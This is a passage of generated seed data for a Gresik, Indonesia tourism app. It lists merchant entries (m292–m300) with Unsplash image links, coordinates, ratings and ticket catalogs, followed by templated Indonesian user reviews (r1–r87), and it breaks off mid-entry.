                "catalog": [
                    {
                        "id": "c292_1",
                        "name": "Tiket / Menu Layanan Benteng Pertahanan",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Benteng Pertahanan Manyar Gresik."
                    },
                    {
                        "id": "c292_2",
                        "name": "Paket Premium Benteng Pertahanan",
                        "price": 60000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m293",
                "name": "Pengrajin Rebana Hadrah Cerme",
                "owner": "Cak Keluarga",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1505253716362-afaea1d3d1af?auto=format&fit=crop&w=600&q=80",
                "description": "Sentra perdagangan belanja produk unggulan lokal berupa pengrajin rebana hadrah yang berada di kawasan strategis Kecamatan Cerme, Gresik.",
                "coords": [
                    -7.194122,
                    112.733482
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c293_1",
                        "name": "Tiket / Menu Layanan Pengrajin Rebana Hadrah",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Pengrajin Rebana Hadrah Manyar Gresik."
                    },
                    {
                        "id": "c293_2",
                        "name": "Paket Premium Pengrajin Rebana Hadrah",
                        "price": 45000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m294",
                "name": "Taman Pasir Bermain Benjeng",
                "owner": "Cak Backpacker",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1534438327276-14e5300c3a48?auto=format&fit=crop&w=600&q=80",
                "description": "Wahana bermain dan rekreasi keluarga terpadu berupa taman pasir bermain yang berada di kawasan strategis Kecamatan Benjeng, Gresik.",
                "coords": [
                    -7.210828,
                    112.574668
                ],
                "rating": 4.3,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c294_1",
                        "name": "Tiket / Menu Layanan Taman Pasir Bermain",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Taman Pasir Bermain Manyar Gresik."
                    },
                    {
                        "id": "c294_2",
                        "name": "Paket Premium Taman Pasir Bermain",
                        "price": 35000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m295",
                "name": "Sanggar Tari Kembang Balongpanggang",
                "owner": "Cak Kulineran",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1589301760014-d929f3979dbc?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat pelestarian warisan budaya kesenian leluhur berupa sanggar tari kembang yang berada di kawasan strategis Kecamatan Balongpanggang, Gresik.",
                "coords": [
                    -7.346742,
                    112.629657
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c295_1",
                        "name": "Tiket / Menu Layanan Sanggar Tari Kembang",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Sanggar Tari Kembang Manyar Gresik."
                    },
                    {
                        "id": "c295_2",
                        "name": "Paket Premium Sanggar Tari Kembang",
                        "price": 40000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m296",
                "name": "Pusat Lepas Tukik Duduksampeyan",
                "owner": "Cak Gresik",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1503676260728-1c00da094a0b?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat riset dan pembelajaran edukatif lapangan berupa pusat lepas tukik yang berada di kawasan strategis Kecamatan Duduksampeyan, Gresik.",
                "coords": [
                    -7.146066,
                    112.593164
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c296_1",
                        "name": "Tiket / Menu Layanan Pusat Lepas Tukik",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Pusat Lepas Tukik Manyar Gresik."
                    },
                    {
                        "id": "c296_2",
                        "name": "Paket Premium Pusat Lepas Tukik",
                        "price": 55000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m297",
                "name": "Es Dawet Siwalan Wringinanom",
                "owner": "Cak AlunAlun",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1565557623262-b51c2513a641?auto=format&fit=crop&w=600&q=80",
                "description": "Warung makan tradisional khas menyajikan menu es dawet siwalan yang berada di kawasan strategis Kecamatan Wringinanom, Gresik.",
                "coords": [
                    -7.107926,
                    112.672103
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c297_1",
                        "name": "Tiket / Menu Layanan Es Dawet Siwalan",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Es Dawet Siwalan Manyar Gresik."
                    },
                    {
                        "id": "c297_2",
                        "name": "Paket Premium Es Dawet Siwalan",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m298",
                "name": "Puncak Awan Driyorejo",
                "owner": "Cak Ziarah",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1464822759023-fed622ff2c3b?auto=format&fit=crop&w=600&q=80",
                "description": "Keindahan panorama alam tersembunyi berupa puncak awan yang berada di kawasan strategis Kecamatan Driyorejo, Gresik.",
                "coords": [
                    -7.458791,
                    112.59371
                ],
                "rating": 4.2,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c298_1",
                        "name": "Tiket / Menu Layanan Puncak Awan",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Puncak Awan Manyar Gresik."
                    },
                    {
                        "id": "c298_2",
                        "name": "Paket Premium Puncak Awan",
                        "price": 35000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m299",
                "name": "Sentra Zikir Kedamean",
                "owner": "Cak Sidayu",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
                "description": "Situs sakral tempat beribadah dan ziarah agung sentra zikir yang berada di kawasan strategis Kecamatan Kedamean, Gresik.",
                "coords": [
                    -7.186414,
                    112.679506
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c299_1",
                        "name": "Tiket / Menu Layanan Sentra Zikir",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Sentra Zikir Manyar Gresik."
                    },
                    {
                        "id": "c299_2",
                        "name": "Paket Premium Sentra Zikir",
                        "price": 45000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m300",
                "name": "Monumen Perjuangan Menganti",
                "owner": "Cak Bawean",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=600&q=80",
                "description": "Bangunan bersejarah peninggalan purbakala berupa monumen perjuangan yang berada di kawasan strategis Kecamatan Menganti, Gresik.",
                "coords": [
                    -7.251572,
                    112.587321
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c300_1",
                        "name": "Tiket / Menu Layanan Monumen Perjuangan",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Monumen Perjuangan Manyar Gresik."
                    },
                    {
                        "id": "c300_2",
                        "name": "Paket Premium Monumen Perjuangan",
                        "price": 50000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            }
        ],
    reviews: [
            {
                "id": "r1",
                "merchantId": "m1",
                "userName": "Haji_Sukri_14",
                "rating": 4,
                "text": "Bumbunya meresap sampai ke dalam. Pelayanannya cepat walau antrean cukup ramai saat akhir pekan.",
                "timestamp": "2026-05-28T14:36:35.380Z"
            },
            {
                "id": "r2",
                "merchantId": "m1",
                "userName": "Neng_Siti_97",
                "rating": 5,
                "text": "Kuliner tradisional Gresik terfavorit keluarga kami. Harganya bersahabat dan tempatnya bersih.",
                "timestamp": "2026-05-14T14:36:35.395Z"
            },
            {
                "id": "r3",
                "merchantId": "m1",
                "userName": "Warkop_Lover_76",
                "rating": 5,
                "text": "Sambalnya mantap betul pedas gurihnya pas. Selalu rindu makan di sini tiap mampir ke Gresik.",
                "timestamp": "2026-05-21T14:36:35.395Z"
            },
            {
                "id": "r4",
                "merchantId": "m2",
                "userName": "Mak_Jah_10",
                "rating": 4,
                "text": "Kuliner tradisional Gresik terfavorit keluarga kami. Harganya bersahabat dan tempatnya bersih.",
                "timestamp": "2026-05-26T14:36:35.395Z"
            },
            {
                "id": "r5",
                "merchantId": "m2",
                "userName": "Haji_Sukri_34",
                "rating": 4,
                "text": "Sambalnya mantap betul pedas gurihnya pas. Selalu rindu makan di sini tiap mampir ke Gresik.",
                "timestamp": "2026-05-19T14:36:35.395Z"
            },
            {
                "id": "r6",
                "merchantId": "m2",
                "userName": "Neng_Siti_34",
                "rating": 5,
                "text": "Enak tenan! Rekomendasi sarapan pagi yang mengenyangkan di daerah sini.",
                "timestamp": "2026-05-24T14:36:35.395Z"
            },
            {
                "id": "r7",
                "merchantId": "m3",
                "userName": "Mak_Jah_88",
                "rating": 4,
                "text": "Kuliner tradisional Gresik terfavorit keluarga kami. Harganya bersahabat dan tempatnya bersih.",
                "timestamp": "2026-05-25T14:36:35.395Z"
            },
            {
                "id": "r8",
                "merchantId": "m3",
                "userName": "Haji_Sukri_79",
                "rating": 5,
                "text": "Sambalnya mantap betul pedas gurihnya pas. Selalu rindu makan di sini tiap mampir ke Gresik.",
                "timestamp": "2026-05-18T14:36:35.395Z"
            },
            {
                "id": "r9",
                "merchantId": "m3",
                "userName": "Neng_Siti_56",
                "rating": 4,
                "text": "Enak tenan! Rekomendasi sarapan pagi yang mengenyangkan di daerah sini.",
                "timestamp": "2026-05-20T14:36:35.395Z"
            },
            {
                "id": "r10",
                "merchantId": "m4",
                "userName": "Mak_Jah_46",
                "rating": 4,
                "text": "Bumbunya meresap sampai ke dalam. Pelayanannya cepat walau antrean cukup ramai saat akhir pekan.",
                "timestamp": "2026-05-21T14:36:35.395Z"
            },
            {
                "id": "r11",
                "merchantId": "m4",
                "userName": "Haji_Sukri_55",
                "rating": 5,
                "text": "Kuliner tradisional Gresik terfavorit keluarga kami. Harganya bersahabat dan tempatnya bersih.",
                "timestamp": "2026-05-16T14:36:35.395Z"
            },
            {
                "id": "r12",
                "merchantId": "m4",
                "userName": "Neng_Siti_33",
                "rating": 4,
                "text": "Sambalnya mantap betul pedas gurihnya pas. Selalu rindu makan di sini tiap mampir ke Gresik.",
                "timestamp": "2026-05-26T14:36:35.395Z"
            },
            {
                "id": "r13",
                "merchantId": "m5",
                "userName": "Mak_Jah_37",
                "rating": 4,
                "text": "Kuliner tradisional Gresik terfavorit keluarga kami. Harganya bersahabat dan tempatnya bersih.",
                "timestamp": "2026-05-21T14:36:35.395Z"
            },
            {
                "id": "r14",
                "merchantId": "m5",
                "userName": "Haji_Sukri_72",
                "rating": 4,
                "text": "Sambalnya mantap betul pedas gurihnya pas. Selalu rindu makan di sini tiap mampir ke Gresik.",
                "timestamp": "2026-05-20T14:36:35.395Z"
            },
            {
                "id": "r15",
                "merchantId": "m5",
                "userName": "Neng_Siti_37",
                "rating": 5,
                "text": "Enak tenan! Rekomendasi sarapan pagi yang mengenyangkan di daerah sini.",
                "timestamp": "2026-05-15T14:36:35.395Z"
            },
            {
                "id": "r16",
                "merchantId": "m6",
                "userName": "Mak_Jah_15",
                "rating": 4,
                "text": "Kuliner tradisional Gresik terfavorit keluarga kami. Harganya bersahabat dan tempatnya bersih.",
                "timestamp": "2026-05-15T14:36:35.395Z"
            },
            {
                "id": "r17",
                "merchantId": "m6",
                "userName": "Haji_Sukri_66",
                "rating": 5,
                "text": "Sambalnya mantap betul pedas gurihnya pas. Selalu rindu makan di sini tiap mampir ke Gresik.",
                "timestamp": "2026-05-19T14:36:35.395Z"
            },
            {
                "id": "r18",
                "merchantId": "m6",
                "userName": "Neng_Siti_54",
                "rating": 5,
                "text": "Enak tenan! Rekomendasi sarapan pagi yang mengenyangkan di daerah sini.",
                "timestamp": "2026-05-15T14:36:35.395Z"
            },
            {
                "id": "r19",
                "merchantId": "m7",
                "userName": "Mak_Jah_77",
                "rating": 4,
                "text": "Bumbunya meresap sampai ke dalam. Pelayanannya cepat walau antrean cukup ramai saat akhir pekan.",
                "timestamp": "2026-05-21T14:36:35.395Z"
            },
            {
                "id": "r20",
                "merchantId": "m7",
                "userName": "Haji_Sukri_74",
                "rating": 5,
                "text": "Kuliner tradisional Gresik terfavorit keluarga kami. Harganya bersahabat dan tempatnya bersih.",
                "timestamp": "2026-05-25T14:36:35.395Z"
            },
            {
                "id": "r21",
                "merchantId": "m7",
                "userName": "Neng_Siti_52",
                "rating": 5,
                "text": "Sambalnya mantap betul pedas gurihnya pas. Selalu rindu makan di sini tiap mampir ke Gresik.",
                "timestamp": "2026-05-28T14:36:35.395Z"
            },
            {
                "id": "r22",
                "merchantId": "m8",
                "userName": "Mak_Jah_53",
                "rating": 4,
                "text": "Kuliner tradisional Gresik terfavorit keluarga kami. Harganya bersahabat dan tempatnya bersih.",
                "timestamp": "2026-05-20T14:36:35.395Z"
            },
            {
                "id": "r23",
                "merchantId": "m8",
                "userName": "Haji_Sukri_12",
                "rating": 4,
                "text": "Sambalnya mantap betul pedas gurihnya pas. Selalu rindu makan di sini tiap mampir ke Gresik.",
                "timestamp": "2026-05-20T14:36:35.395Z"
            },
            {
                "id": "r24",
                "merchantId": "m8",
                "userName": "Neng_Siti_49",
                "rating": 5,
                "text": "Enak tenan! Rekomendasi sarapan pagi yang mengenyangkan di daerah sini.",
                "timestamp": "2026-05-15T14:36:35.395Z"
            },
            {
                "id": "r25",
                "merchantId": "m9",
                "userName": "Haji_Sukri_61",
                "rating": 4,
                "text": "Kuliner tradisional Gresik terfavorit keluarga kami. Harganya bersahabat dan tempatnya bersih.",
                "timestamp": "2026-05-21T14:36:35.395Z"
            },
            {
                "id": "r26",
                "merchantId": "m9",
                "userName": "Neng_Siti_77",
                "rating": 4,
                "text": "Sambalnya mantap betul pedas gurihnya pas. Selalu rindu makan di sini tiap mampir ke Gresik.",
                "timestamp": "2026-05-28T14:36:35.395Z"
            },
            {
                "id": "r27",
                "merchantId": "m9",
                "userName": "Warkop_Lover_95",
                "rating": 5,
                "text": "Enak tenan! Rekomendasi sarapan pagi yang mengenyangkan di daerah sini.",
                "timestamp": "2026-05-21T14:36:35.395Z"
            },
            {
                "id": "r28",
                "merchantId": "m10",
                "userName": "Mak_Jah_10",
                "rating": 4,
                "text": "Bumbunya meresap sampai ke dalam. Pelayanannya cepat walau antrean cukup ramai saat akhir pekan.",
                "timestamp": "2026-05-20T14:36:35.395Z"
            },
            {
                "id": "r29",
                "merchantId": "m10",
                "userName": "Haji_Sukri_67",
                "rating": 4,
                "text": "Kuliner tradisional Gresik terfavorit keluarga kami. Harganya bersahabat dan tempatnya bersih.",
                "timestamp": "2026-05-17T14:36:35.395Z"
            },
            {
                "id": "r30",
                "merchantId": "m10",
                "userName": "Neng_Siti_63",
                "rating": 5,
                "text": "Sambalnya mantap betul pedas gurihnya pas. Selalu rindu makan di sini tiap mampir ke Gresik.",
                "timestamp": "2026-05-23T14:36:35.395Z"
            },
            {
                "id": "r31",
                "merchantId": "m11",
                "userName": "Haji_Sukri_93",
                "rating": 4,
                "text": "Bumbunya meresap sampai ke dalam. Pelayanannya cepat walau antrean cukup ramai saat akhir pekan.",
                "timestamp": "2026-05-24T14:36:35.395Z"
            },
            {
                "id": "r32",
                "merchantId": "m11",
                "userName": "Neng_Siti_54",
                "rating": 4,
                "text": "Kuliner tradisional Gresik terfavorit keluarga kami. Harganya bersahabat dan tempatnya bersih.",
                "timestamp": "2026-05-16T14:36:35.395Z"
            },
            {
                "id": "r33",
                "merchantId": "m11",
                "userName": "Warkop_Lover_27",
                "rating": 5,
                "text": "Sambalnya mantap betul pedas gurihnya pas. Selalu rindu makan di sini tiap mampir ke Gresik.",
                "timestamp": "2026-05-22T14:36:35.395Z"
            },
            {
                "id": "r34",
                "merchantId": "m12",
                "userName": "Mak_Jah_88",
                "rating": 4,
                "text": "Bumbunya meresap sampai ke dalam. Pelayanannya cepat walau antrean cukup ramai saat akhir pekan.",
                "timestamp": "2026-05-25T14:36:35.395Z"
            },
            {
                "id": "r35",
                "merchantId": "m12",
                "userName": "Haji_Sukri_60",
                "rating": 5,
                "text": "Kuliner tradisional Gresik terfavorit keluarga kami. Harganya bersahabat dan tempatnya bersih.",
                "timestamp": "2026-05-24T14:36:35.395Z"
            },
            {
                "id": "r36",
                "merchantId": "m12",
                "userName": "Neng_Siti_60",
                "rating": 4,
                "text": "Sambalnya mantap betul pedas gurihnya pas. Selalu rindu makan di sini tiap mampir ke Gresik.",
                "timestamp": "2026-05-27T14:36:35.395Z"
            },
            {
                "id": "r37",
                "merchantId": "m13",
                "userName": "Mak_Jah_33",
                "rating": 4,
                "text": "Bumbunya meresap sampai ke dalam. Pelayanannya cepat walau antrean cukup ramai saat akhir pekan.",
                "timestamp": "2026-05-26T14:36:35.395Z"
            },
            {
                "id": "r38",
                "merchantId": "m13",
                "userName": "Haji_Sukri_94",
                "rating": 4,
                "text": "Kuliner tradisional Gresik terfavorit keluarga kami. Harganya bersahabat dan tempatnya bersih.",
                "timestamp": "2026-05-28T14:36:35.395Z"
            },
            {
                "id": "r39",
                "merchantId": "m13",
                "userName": "Neng_Siti_56",
                "rating": 4,
                "text": "Sambalnya mantap betul pedas gurihnya pas. Selalu rindu makan di sini tiap mampir ke Gresik.",
                "timestamp": "2026-05-14T14:36:35.395Z"
            },
            {
                "id": "r40",
                "merchantId": "m14",
                "userName": "Mak_Jah_21",
                "rating": 4,
                "text": "Pantainya bersih dengan ombak yang bersahabat untuk anak-anak bermain air pasir putih.",
                "timestamp": "2026-05-18T14:36:35.395Z"
            },
            {
                "id": "r41",
                "merchantId": "m14",
                "userName": "Haji_Sukri_62",
                "rating": 5,
                "text": "Sangat cocok untuk bumi perkemahan atau sekadar berburu sunrise kabut pagi hari yang indah.",
                "timestamp": "2026-05-22T14:36:35.395Z"
            },
            {
                "id": "r42",
                "merchantId": "m14",
                "userName": "Neng_Siti_80",
                "rating": 5,
                "text": "Akses jalan menuju lokasi sudah cukup baik dan tertata rapi oleh pokdarwis setempat.",
                "timestamp": "2026-05-27T14:36:35.395Z"
            },
            {
                "id": "r43",
                "merchantId": "m15",
                "userName": "Mak_Jah_55",
                "rating": 4,
                "text": "Pantainya bersih dengan ombak yang bersahabat untuk anak-anak bermain air pasir putih.",
                "timestamp": "2026-05-22T14:36:35.395Z"
            },
            {
                "id": "r44",
                "merchantId": "m15",
                "userName": "Haji_Sukri_82",
                "rating": 5,
                "text": "Sangat cocok untuk bumi perkemahan atau sekadar berburu sunrise kabut pagi hari yang indah.",
                "timestamp": "2026-05-14T14:36:35.395Z"
            },
            {
                "id": "r45",
                "merchantId": "m15",
                "userName": "Neng_Siti_41",
                "rating": 4,
                "text": "Akses jalan menuju lokasi sudah cukup baik dan tertata rapi oleh pokdarwis setempat.",
                "timestamp": "2026-05-21T14:36:35.395Z"
            },
            {
                "id": "r46",
                "merchantId": "m16",
                "userName": "Mak_Jah_42",
                "rating": 4,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-15T14:36:35.395Z"
            },
            {
                "id": "r47",
                "merchantId": "m16",
                "userName": "Haji_Sukri_82",
                "rating": 5,
                "text": "Pantainya bersih dengan ombak yang bersahabat untuk anak-anak bermain air pasir putih.",
                "timestamp": "2026-05-27T14:36:35.395Z"
            },
            {
                "id": "r48",
                "merchantId": "m16",
                "userName": "Neng_Siti_49",
                "rating": 5,
                "text": "Sangat cocok untuk bumi perkemahan atau sekadar berburu sunrise kabut pagi hari yang indah.",
                "timestamp": "2026-05-24T14:36:35.395Z"
            },
            {
                "id": "r49",
                "merchantId": "m17",
                "userName": "Haji_Sukri_86",
                "rating": 4,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-20T14:36:35.395Z"
            },
            {
                "id": "r50",
                "merchantId": "m17",
                "userName": "Neng_Siti_49",
                "rating": 4,
                "text": "Pantainya bersih dengan ombak yang bersahabat untuk anak-anak bermain air pasir putih.",
                "timestamp": "2026-05-23T14:36:35.395Z"
            },
            {
                "id": "r51",
                "merchantId": "m17",
                "userName": "Warkop_Lover_80",
                "rating": 4,
                "text": "Sangat cocok untuk bumi perkemahan atau sekadar berburu sunrise kabut pagi hari yang indah.",
                "timestamp": "2026-05-22T14:36:35.395Z"
            },
            {
                "id": "r52",
                "merchantId": "m18",
                "userName": "Mak_Jah_33",
                "rating": 4,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-14T14:36:35.395Z"
            },
            {
                "id": "r53",
                "merchantId": "m18",
                "userName": "Haji_Sukri_42",
                "rating": 5,
                "text": "Pantainya bersih dengan ombak yang bersahabat untuk anak-anak bermain air pasir putih.",
                "timestamp": "2026-05-24T14:36:35.395Z"
            },
            {
                "id": "r54",
                "merchantId": "m18",
                "userName": "Neng_Siti_92",
                "rating": 4,
                "text": "Sangat cocok untuk bumi perkemahan atau sekadar berburu sunrise kabut pagi hari yang indah.",
                "timestamp": "2026-05-26T14:36:35.395Z"
            },
            {
                "id": "r55",
                "merchantId": "m19",
                "userName": "Cak_Mat_94",
                "rating": 4,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-21T14:36:35.395Z"
            },
            {
                "id": "r56",
                "merchantId": "m19",
                "userName": "Mak_Jah_79",
                "rating": 5,
                "text": "Pantainya bersih dengan ombak yang bersahabat untuk anak-anak bermain air pasir putih.",
                "timestamp": "2026-05-26T14:36:35.395Z"
            },
            {
                "id": "r57",
                "merchantId": "m19",
                "userName": "Haji_Sukri_61",
                "rating": 5,
                "text": "Sangat cocok untuk bumi perkemahan atau sekadar berburu sunrise kabut pagi hari yang indah.",
                "timestamp": "2026-05-28T14:36:35.395Z"
            },
            {
                "id": "r58",
                "merchantId": "m20",
                "userName": "Mak_Jah_42",
                "rating": 4,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-25T14:36:35.395Z"
            },
            {
                "id": "r59",
                "merchantId": "m20",
                "userName": "Haji_Sukri_53",
                "rating": 5,
                "text": "Pantainya bersih dengan ombak yang bersahabat untuk anak-anak bermain air pasir putih.",
                "timestamp": "2026-05-24T14:36:35.395Z"
            },
            {
                "id": "r60",
                "merchantId": "m20",
                "userName": "Neng_Siti_71",
                "rating": 5,
                "text": "Sangat cocok untuk bumi perkemahan atau sekadar berburu sunrise kabut pagi hari yang indah.",
                "timestamp": "2026-05-17T14:36:35.395Z"
            },
            {
                "id": "r61",
                "merchantId": "m21",
                "userName": "Mak_Jah_56",
                "rating": 4,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-21T14:36:35.395Z"
            },
            {
                "id": "r62",
                "merchantId": "m21",
                "userName": "Haji_Sukri_93",
                "rating": 5,
                "text": "Pantainya bersih dengan ombak yang bersahabat untuk anak-anak bermain air pasir putih.",
                "timestamp": "2026-05-22T14:36:35.395Z"
            },
            {
                "id": "r63",
                "merchantId": "m21",
                "userName": "Neng_Siti_31",
                "rating": 4,
                "text": "Sangat cocok untuk bumi perkemahan atau sekadar berburu sunrise kabut pagi hari yang indah.",
                "timestamp": "2026-05-15T14:36:35.395Z"
            },
            {
                "id": "r64",
                "merchantId": "m22",
                "userName": "Mak_Jah_42",
                "rating": 4,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-16T14:36:35.395Z"
            },
            {
                "id": "r65",
                "merchantId": "m22",
                "userName": "Haji_Sukri_68",
                "rating": 5,
                "text": "Pantainya bersih dengan ombak yang bersahabat untuk anak-anak bermain air pasir putih.",
                "timestamp": "2026-05-25T14:36:35.395Z"
            },
            {
                "id": "r66",
                "merchantId": "m22",
                "userName": "Neng_Siti_65",
                "rating": 4,
                "text": "Sangat cocok untuk bumi perkemahan atau sekadar berburu sunrise kabut pagi hari yang indah.",
                "timestamp": "2026-05-14T14:36:35.395Z"
            },
            {
                "id": "r67",
                "merchantId": "m23",
                "userName": "Mak_Jah_23",
                "rating": 4,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-23T14:36:35.395Z"
            },
            {
                "id": "r68",
                "merchantId": "m23",
                "userName": "Haji_Sukri_81",
                "rating": 4,
                "text": "Pantainya bersih dengan ombak yang bersahabat untuk anak-anak bermain air pasir putih.",
                "timestamp": "2026-05-27T14:36:35.395Z"
            },
            {
                "id": "r69",
                "merchantId": "m23",
                "userName": "Neng_Siti_65",
                "rating": 5,
                "text": "Sangat cocok untuk bumi perkemahan atau sekadar berburu sunrise kabut pagi hari yang indah.",
                "timestamp": "2026-05-22T14:36:35.395Z"
            },
            {
                "id": "r70",
                "merchantId": "m24",
                "userName": "Mak_Jah_22",
                "rating": 4,
                "text": "Pemandangannya sangat asri, menyejukkan mata dan pikiran setelah penat bekerja seminggu penuh.",
                "timestamp": "2026-05-14T14:36:35.395Z"
            },
            {
                "id": "r71",
                "merchantId": "m24",
                "userName": "Haji_Sukri_20",
                "rating": 4,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-26T14:36:35.395Z"
            },
            {
                "id": "r72",
                "merchantId": "m24",
                "userName": "Neng_Siti_97",
                "rating": 4,
                "text": "Pantainya bersih dengan ombak yang bersahabat untuk anak-anak bermain air pasir putih.",
                "timestamp": "2026-05-19T14:36:35.395Z"
            },
            {
                "id": "r73",
                "merchantId": "m25",
                "userName": "Mak_Jah_77",
                "rating": 4,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-21T14:36:35.395Z"
            },
            {
                "id": "r74",
                "merchantId": "m25",
                "userName": "Haji_Sukri_89",
                "rating": 4,
                "text": "Pantainya bersih dengan ombak yang bersahabat untuk anak-anak bermain air pasir putih.",
                "timestamp": "2026-05-26T14:36:35.395Z"
            },
            {
                "id": "r75",
                "merchantId": "m25",
                "userName": "Neng_Siti_36",
                "rating": 4,
                "text": "Sangat cocok untuk bumi perkemahan atau sekadar berburu sunrise kabut pagi hari yang indah.",
                "timestamp": "2026-05-28T14:36:35.395Z"
            },
            {
                "id": "r76",
                "merchantId": "m26",
                "userName": "Mak_Jah_61",
                "rating": 4,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-27T14:36:35.395Z"
            },
            {
                "id": "r77",
                "merchantId": "m26",
                "userName": "Haji_Sukri_73",
                "rating": 5,
                "text": "Pantainya bersih dengan ombak yang bersahabat untuk anak-anak bermain air pasir putih.",
                "timestamp": "2026-05-25T14:36:35.395Z"
            },
            {
                "id": "r78",
                "merchantId": "m26",
                "userName": "Neng_Siti_90",
                "rating": 5,
                "text": "Sangat cocok untuk bumi perkemahan atau sekadar berburu sunrise kabut pagi hari yang indah.",
                "timestamp": "2026-05-14T14:36:35.395Z"
            },
            {
                "id": "r79",
                "merchantId": "m27",
                "userName": "Mak_Jah_37",
                "rating": 4,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-24T14:36:35.395Z"
            },
            {
                "id": "r80",
                "merchantId": "m27",
                "userName": "Haji_Sukri_40",
                "rating": 4,
                "text": "Pantainya bersih dengan ombak yang bersahabat untuk anak-anak bermain air pasir putih.",
                "timestamp": "2026-05-24T14:36:35.395Z"
            },
            {
                "id": "r81",
                "merchantId": "m27",
                "userName": "Neng_Siti_99",
                "rating": 5,
                "text": "Sangat cocok untuk bumi perkemahan atau sekadar berburu sunrise kabut pagi hari yang indah.",
                "timestamp": "2026-05-24T14:36:35.395Z"
            },
            {
                "id": "r82",
                "merchantId": "m28",
                "userName": "Mak_Jah_45",
                "rating": 4,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-23T14:36:35.395Z"
            },
            {
                "id": "r83",
                "merchantId": "m28",
                "userName": "Haji_Sukri_93",
                "rating": 4,
                "text": "Pantainya bersih dengan ombak yang bersahabat untuk anak-anak bermain air pasir putih.",
                "timestamp": "2026-05-24T14:36:35.395Z"
            },
            {
                "id": "r84",
                "merchantId": "m28",
                "userName": "Neng_Siti_13",
                "rating": 5,
                "text": "Sangat cocok untuk bumi perkemahan atau sekadar berburu sunrise kabut pagi hari yang indah.",
                "timestamp": "2026-05-26T14:36:35.395Z"
            },
            {
                "id": "r85",
                "merchantId": "m29",
                "userName": "Mak_Jah_44",
                "rating": 4,
                "text": "Arsitektur ukiran gapura nisan cagar budaya yang sangat sakral dan bersejarah tinggi.",
                "timestamp": "2026-05-28T14:36:35.395Z"
            },
            {
                "id": "r86",
                "merchantId": "m29",
                "userName": "Haji_Sukri_69",
                "rating": 5,
                "text": "Menyediakan fasilitas wudhu dan toilet yang sangat bersih, membuat peziarah nyaman berlama-lama.",
                "timestamp": "2026-05-16T14:36:35.395Z"
            },
            {
                "id": "r87",
                "merchantId": "m29",
